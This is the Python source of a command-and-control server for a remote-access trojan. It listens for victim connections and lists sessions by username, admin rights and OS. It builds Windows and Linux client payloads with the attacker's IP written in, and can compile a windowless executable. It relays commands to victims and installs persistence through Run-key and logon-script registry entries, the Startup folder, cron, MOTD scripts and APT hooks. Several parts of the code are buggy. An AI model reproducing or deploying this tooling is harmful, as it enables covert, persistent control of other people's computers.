import socket
import sys
import threading
from prettytable import PrettyTable
import random
import string
import os
import os.path
import shutil
import subprocess

def winclient():
    name = (''.join(random.choices(string.ascii_lowercase,k=7)))
    filename = name+".py"
    curr_dir = os.getcwd()
    if os.path.exists(curr_dir+"/"+"winclient.py"):
        shutil.copy("winclient.py",filename)
    else:
        print("File not found")
    with open(filename) as f:
        new_host=f.read().replace("INPUT_IP_HERE", host_ip)
    with open(filename,'w') as f:
        f.write(new_host)
        f.close()
    with open(filename) as f:
        new_host=f.read().replace("INPUT_PORT_HERE", host_port)
    with open(filename,'w') as f:
        f.write(new_host)
        f.close()
                
def linuxclient():
    name = (''.join(random.choices(string.ascii_lowercase,k=7)))
    filename = name+".py"
    curr_dir = os.getcwd()
    if os.path.exists(curr_dir+"/"+"linuxclient.py"):
        shutil.copy("linuxclient.py",filename)
    else:
        print("File not found")
    with open(filename) as f:
        new_host=f.read().replace("INPUT_IP_HERE", host_ip)
    with open(filename,'w') as f:
        f.write(new_host)
        f.close()
    with open(filename) as f:
        new_host=f.read().replace("INPUT_PORT_HERE", host_port)
    with open(filename,'w') as f:
        f.write(new_host)
        f.close()

def execlient():
    name = (''.join(random.choices(string.ascii_lowercase,k=7)))
    filename = name+".py"
    exename = name+".py"
    curr_dir = os.getcwd()
    if os.path.exists(curr_dir+"/"+"winclient.py"):
        shutil.copy("winclient.py",filename)
    else:
        print("File not found")
    with open(filename) as f:
        new_host=f.read().replace("INPUT_IP_HERE", host_ip)
    with open(filename,'w') as f:
        f.write(new_host)
        f.close()
    with open(filename) as f:
        new_host=f.read().replace("INPUT_PORT_HERE", host_port)
    with open(filename,'w') as f:
        f.write(new_host)
        f.close()
    pyinstaller_exec="pyinstaller " + filename + " -w --clean --onefile --distpath ."
    print("\nCompiling executable file ")
    subprocess.call(pyinstaller_exec,stderr=subprocess.DEVNULL)
    os.remove(name+".spec")
    shutil.rmtree('build')
    if os.path.exists(curr_dir+"/"+exename):
        print("Exe saved in current directory")
    else:
        print("File not found")

def conn_handler():
    while True:
        if kill_flag==1:
            break
        try:
            conn, addr = sock.accept()
            print("Connected with ", addr[0])
            username=conn_in(conn)
            admin=conn_in(conn)
            platform=conn_in(conn)
            if admin==1:
                admin_val="Yes"
            elif username=="root":
                admin_val="Yes"
            else:
                admin_val="No"
            if 'Windows' in platform:
                plat_val = 1
            elif 'Linux' in platform:
                plat_val = 2
            else:
                plat_val = 0
            a.append([conn,addr[0]],username,admin_val,plat_val,'Active')
        except:
            pass

def target_conn(target_id, a, num):
    while True:
        try:
            msg = input('Message to send to client : ')
            conn_out(target_id, msg)
            if msg == "exit":
                print("closing the connection")
                target_id.close()
                a[num][5]="Dead"
                break
            elif msg == 'background':
                break
            elif msg == 'help':
                pass
            elif msg == 'persist':
                payload = input("Enter the name of payload with extension to enter persistance")
                if a[num][6] == 1:
                    persist_type = input("Enter which type of persistance do you want to use \n 1 for Autorun\n 2 for Startup menu 3 for Logon Script")
                    if persist_type == 1:
                        persist_command_1 = f'cmd.exe /c copy {payload} C:\\Users\\Public'
                        conn_out(target_id, persist_command_1)
                        persist_command_2 = f'reg add HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v screendoor /t REG_SZ /d C:\\Users\\Public\\{payload}'
                        conn_out(target_id, persist_command_2)
                        print("Enter following command to clean up registry : \n  reg delete HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run /v screendoor /f")
                    elif persist_type == 2:
                        persist_command_1 = f'cmd.exe /c copy {payload} C:\\Users\\{a[num][2]}\\AppData\\Roaming\\Microsoft\\Windows\\StartMenu\\Program\\Startup'
                        conn_out(target_id, persist_command_1)
                        print(f'Enter following command to clean up : \n  del /f C:\\Users\\{a[num][2]}\\AppData\\Roaming\\Microsoft\\Windows\\StartMenu\\Program\\Startup')
                    elif persist_type == 3:
                        persist_command_1 = f'cmd.exe /c copy {payload} C:\\Users\\Public'
                        conn_out(target_id, persist_command_1)
                        persist_command_2 = f'reg add HKEY_CURRENT_USER\\Environment /v UserInitMprLogonScript /t REG_SZ /d C:\\Users\\Public\\{payload}'
                        conn_out(target_id, persist_command_2)
                        print(f'Enter following command to clean up registry : \n  "reg add HKEY_CURRENT_USER\\Environment /v UserInitMprLogonScript /t REG_SZ /d"')
                    else:
                        print("Enter correct option")
                        pass
                elif a[num][6] == 2:
                    persist_type = input("Enter which type of persistance do you want to use \n 1 for Cronjob\n 2 for MOTD Backdooring(Need to be root) 3 for APT Backdooring(Need to be root)")
                    if persist_type == 1:
                        persist_command_1 = f'echo "*/5 * * * * python3 /home/{target[num][3]}/{payload}" | crontab -'
                        conn_out(target_id, persist_command_1)
                        print("Enter following command to clean up : \n  crontab -r")
                    elif persist_type == 2:
                        persist_command_1 = f'echo "python3 /home/target[num][3]/{payload}" >> /etc/update-motd.d/10-uname'
                        conn_out(target_id, persist_command_1)
                        print(f'Enter following command to clean up : \n  sed -i "/python3/d" /etc/update-motd.d/10-uname')
                    elif persist_type == 3:
                        persist_command_1 = f'echo "python3 /home/{target[num][0]}/{payload}" >> /etc/apt/apt.conf.d/01persist'
                        conn_out(target_id, persist_command_1)
                        print(f'Enter following command to clean up : \n  "rm 01persist"')
                    else:
                        print("Enter correct option")
                        pass
            res = conn_in(target_id)
            if res == 'exit':
                print('client closed connection')
                target_id.close()
                a[num][5]= "Dead"
                break
            print('response from client : ', res)
        except KeyboardInterrupt:
            print('\n keyboard interrupt issued')
            msg = "exit"
            conn_out(target_id, msg)
            target_id.close()
            break
        except Exception:
            target_id.close()
            break

def conn_in(conn):
    print('waiting for response')
    res = conn.recv(1024).decode()
    return res
def conn_out(conn, msg):
    conn.send(msg.encode())
def listener_handler():
    sock.bind((host_ip, int(host_port)))
    print('listening for connection')
    sock.listen()
    t1 = threading.Thread(target=conn_handler)
    t1.start()

if __name__=='__main__':
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    a = []
    listener_count=0
    kill_flag=0
    while True:
        try:
            command = input("Enter Command : ")
            if command == "listener -g":
                host_ip=input("\nEnter the host ip to listen : ")
                host_port=input("\nEnter host port to listen : ")
                listener_handler()
                listener_count += 1
            if command == "winclient.py":
                if listener_count > 0:
                    winclient()
                else:
                    print("No active listner available")
            if command == "linuxclient.py":
                if listener_count > 0:
                    linuxclient()
                else:
                    print("No active listner available")
            if command == "execlient":
                if listener_count > 0:
                    execlient()
                else:
                    print("No active listner available")           
            if command.split(" ")[0].lower() == "sessions":
                session_counter=0
                if command.split(" ")[1] == "-l":
                    table=PrettyTable()
                    table.field_names = ['Session_id', 'Target_ip','Username','Admin','OS', 'Status']
                    table.padding_width = 3
                    for target in a:
                            table.add_row([str(session_counter),target[1]],target[2],target[3],target[4],target[5])
                            session_counter += 1
                    print(table)
                if command.split(" ")[1] == "-i":
                    try:
                        num = int(command.split(" ")[2])
                        target_id = a[num][0]
                        if a[num][5] == "Active":
                            target_conn(target_id,a,num)
                        else:
                            print("Session is already Dead")
                    except IndexError:
                        print(f'session {num} does not exist')
        except KeyboardInterrupt:
            print("\n Keyboard interrupt issued")
            quit_msg=input("Do you want to quit?\n Press Y if Yes and N if No")
            if quit_msg.lower()=='y':
                for target in a:
                    if target[5] == "Dead":
                        pass
                    else:
                        conn_out(target[0], "exit")
                kill_flag=1
                if listener_count > 0:
                    sock.close()
                break
            else : 
                continue

                   







    